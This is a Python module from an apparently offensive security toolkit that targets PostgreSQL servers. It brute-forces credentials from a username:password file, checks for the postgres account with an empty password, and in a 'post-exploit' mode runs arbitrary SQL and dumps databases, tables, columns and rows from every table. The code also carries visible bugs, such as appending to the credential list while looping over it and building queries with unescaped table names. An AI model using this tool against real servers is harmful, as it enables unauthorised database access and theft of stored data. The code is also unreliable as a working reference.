import psycopg
from src.utilities.utilities import Version_Vuln_List_Host_Data, get_default_context_execution2, error_handler, get_hosts_from_file, get_hosts_from_file2, add_default_parser_arguments
from src.services.consts import DEFAULT_ERRORS, DEFAULT_THREAD, DEFAULT_TIMEOUT, DEFAULT_VERBOSE
from src.services.serviceclass import BaseServiceClass
from src.services.servicesubclass import BaseSubServiceClass

class PSQLBruteSubServiceClass(BaseSubServiceClass):
    def __init__(self) -> None:
        super().__init__("brute", "Bruteforce")

    def helper_parse(self, subparsers):
        parser = subparsers.add_parser(self.command_name, help = self.help_description)
        parser.add_argument("target", type=str, help="File name or targets seperated by space")
        parser.add_argument("credential", type=str, help="Credential file, format is username:password")
        add_default_parser_arguments(parser, False)
        parser.set_defaults(func=self.console)

    def console(self, args):
        self.nv(get_hosts_from_file2(args.target), creds=get_hosts_from_file(args.credential), threads=args.threads, timeout=args.timeout, errors=args.errors, verbose=args.verbose)

    def nv(self, hosts, **kwargs):
        super().nv(hosts, kwargs=kwargs)
        creds= kwargs.get("creds", [])

        results: list[str] = get_default_context_execution2("PostgreSQL Bruteforce", self.threads, hosts, self.single, creds=creds, timeout=self.timeout, errors=self.errors, verbose=self.verbose)

        if results:
            self.print_output("Valid PostgreSQL credential found:")
            for r in results:
                self.print_output(f"    {r}")



    @error_handler(["host"])
    def single(self, host, **kwargs):
        creds = kwargs.get("creds", [])

        ip = host.ip
        port = host.port


        for cred in creds:
            u, p = cred.split(":")

            try:
                db_params = {
                    "user": u,
                    "password": p,
                    "host": ip,
                    "port": int(port),
                }
                with psycopg.connect(**db_params) as con: # type: ignore
                    with con.cursor() as cur:
                        creds.append(f"{u}:{p}")

            except Exception:
                pass
        if creds: 
            return f"{host} - {",".join(creds)}"

class PSQLDefaultSubServiceClass(BaseSubServiceClass):
    def __init__(self) -> None:
        super().__init__("default", "Checks if default/empty password is used")

    def nv(self, hosts, **kwargs):
        super().nv(hosts, kwargs=kwargs)

        results: list[Version_Vuln_List_Host_Data] = get_default_context_execution2("PostgreSQL without Password Usage", self.threads, hosts, self.single, timeout=self.timeout, errors=self.errors, verbose=self.verbose)

        if results:
            self.print_output("PostgreSQL servers that allows user postgres with empty password authentication:")
            for r in results:
                self.print_output(f"{r.host}: Databases: {", ".join(r.version)}")



    @error_handler(["host"])
    def single(self, host, **kwargs):
        ip = host.ip
        port = host.port

        db_params = {
            "user": "postgres",
            "password": "",
            "host": ip,
            "port": int(port),
        }
        with psycopg.connect(**db_params) as con: # type: ignore
            with con.cursor() as cur:
                cur.execute("SELECT datname FROM pg_database;")
                dbs = [record[0] for record in cur]
                return Version_Vuln_List_Host_Data(host, dbs)


class PSQLPostSubServiceClass(BaseSubServiceClass):
    def __init__(self) -> None:
        super().__init__("post", "Post-exploit stuff")

    def helper_parse(self, subparsers):
        parser = subparsers.add_parser(self.command_name, help = self.help_description)
        parser.add_argument("target", type=str, help="File name or targets seperated by space")
        parser.add_argument("username", type=str, default="postgres", help="Username (Default = postgres)")
        parser.add_argument("password", type=str, default="", help="Username (Default = '')")
        parser.add_argument("--sql", type=str, help="Run SQL on target")
        parser.add_argument("--databases", action="store_true", help="Print databases")
        parser.add_argument("--database", type=str, help="Select database")
        parser.add_argument("--tables", action="store_true", help="Print tables of selected database")
        parser.add_argument("--table", type=str, help="Select table")
        parser.add_argument("--columns", action="store_true", help="Print columns of selected table")
        parser.add_argument("--column", nargs="+", help="Print values of selected columns")
        parser.add_argument("--limit", type=int, default=10, help="Row Limit (Default = 10)")
        add_default_parser_arguments(parser, False)
        parser.set_defaults(func=self.console)

    def console(self, args):
        self.nv(get_hosts_from_file2(args.target), username=args.username, password=args.password, sql=args.sql, limit=args.limit, 
                databases=args.databases, database=args.database, tables=args.tables, table=args.table, 
                columns=args.columns, column=args.column, threads=args.threads, timeout=args.timeout, 
                errors=args.errors, verbose=args.verbose)
    
    @error_handler([])
    def nv(self, hosts, **kwargs):
        username = kwargs.get("username", 'postgres')
        password = kwargs.get("password", '')
        sql = kwargs.get('sql', '')
        databases = kwargs.get('databases', False)
        database = kwargs.get('database', '')
        tables = kwargs.get('tables', False)
        table = kwargs.get('table', '')
        columns = kwargs.get('columns', False)
        column = kwargs.get('column', '')
        row_limit = kwargs.get("limit", 10)

        if (tables or table) and not database:
            print("You need to select a database with argument --database")
            return
        
        if (column or columns) and not table:
            print("You need to select a table with argument --table")
            return

        for host in hosts:
            try:
                ip = host.ip
                port = host.port
                if sql:
                    db_params = {
                        "user": username,
                        "password": password,
                        "host": ip,
                        "port": int(port),
                    }
                    with psycopg.connect(**db_params) as con: # type: ignore
                        with con.cursor() as cur:
                            cur.execute(sql)
                            for record in cur:
                                self.print_output(host)
                                self.print_output(record)
                    continue

                if databases:
                    db_params = {
                        "user": username,
                        "password": password,
                        "host": ip,
                        "port": int(port),
                    }
                    with psycopg.connect(**db_params) as con: # type: ignore
                        with con.cursor() as cur:
                            cur.execute("SELECT datname FROM pg_database;")
                            dbs = [record[0] for record in cur]
                            for db in dbs:
                                self.print_output(f"Host: {host} - Database: {db}")
                    continue
                if tables:
                    db_params = {
                        "dbname": database,
                        "user": "postgres",
                        "password": "",
                        "host": ip,
                        "port": int(port),
                    }
                    with psycopg.connect(**db_params) as con: # type: ignore
                        with con.cursor() as cur:
                            cur.execute("SELECT table_name FROM information_schema.tables WHERE table_schema = 'public';")
                            db_tables = [record[0] for record in cur]
                            for db_table in db_tables:
                                self.print_output(f"Host: {host} - Database: {database} - Table: {db_table}")
                    continue
                
                if columns:
                    db_params = {
                        "dbname": database,
                        "user": "postgres",
                        "password": "",
                        "host": ip,
                        "port": int(port),
                    }
                    with psycopg.connect(**db_params) as con: # type: ignore
                        with con.cursor() as cur:
                            cur.execute(f"SELECT column_name, data_type FROM information_schema.columns WHERE table_name = '{table}';") # type: ignore
                            for c in cur:
                                self.print_output(f"Host: {host} - Database: {database} - Table: {table} - Column: {c[0]} - ColumnType: {c[1]}")
                    continue
                
                if database and table and column:
                    db_params = {
                        "dbname": database,
                        "user": "postgres",
                        "password": "",
                        "host": ip,
                        "port": int(port),
                    }
                    with psycopg.connect(**db_params) as con: # type: ignore
                        with con.cursor() as cur:
                            cur.execute(f"SELECT {", ".join(column)} FROM {table} LIMIT {row_limit};") # type: ignore
                            self.print_output(f"Host: {host} - Database: {database} - Table: {table} - Columns: {", ".join(column)}")
                            for v in cur:
                                self.print_output(v)
                    continue
                db_params = {
                    "user": username,
                    "password": password,
                    "host": ip,
                    "port": int(port),
                }
                with psycopg.connect(**db_params) as con: # type: ignore
                    with con.cursor() as cur:
                        cur.execute("SELECT datname FROM pg_database;")
                        dbs = [record[0] for record in cur]
                        for db in dbs:
                            try:
                                db_params = {
                                    "dbname": db,
                                    "user": username,
                                    "password": password,
                                    "host": ip,
                                    "port": int(port),
                                }
                                with psycopg.connect(**db_params) as con: # type: ignore
                                    with con.cursor() as cur:
                                        cur.execute("SELECT table_name FROM information_schema.tables WHERE table_schema = 'public';")
                                        db_tables = [record[0] for record in cur]
                                        for db_table in db_tables:
                                            try:
                                                cur.execute(f"SELECT column_name, data_type FROM information_schema.columns WHERE table_name = '{db_table}';") # type: ignore
                                                db_columns = []
                                                for c in cur:
                                                    db_columns.append(c[0])
                                                self.print_output("")
                                                try:
                                                    cur.execute(f"SELECT {", ".join(db_columns)} FROM {db_table} LIMIT {row_limit};") # type: ignore
                                                    self.print_output(f"Host: {host} - Database: {db} - Table: {db_table} - Columns: {", ".join(db_columns)} - Limit: {row_limit}")
                                                    for v in cur:
                                                        self.print_output(v)
                                                    self.print_output("")
                                                except Exception as e: pass
                                                self.print_output("")
                                            except Exception as e: pass
                                        
                                            
                            except Exception as e: pass
                
            except Exception as e: pass

class PSQLServiceClass(BaseServiceClass):
    def __init__(self) -> None:
        super().__init__("psql")
        self.register_subservice(PSQLDefaultSubServiceClass())
        self.register_subservice(PSQLBruteSubServiceClass())
        self.register_subservice(PSQLPostSubServiceClass())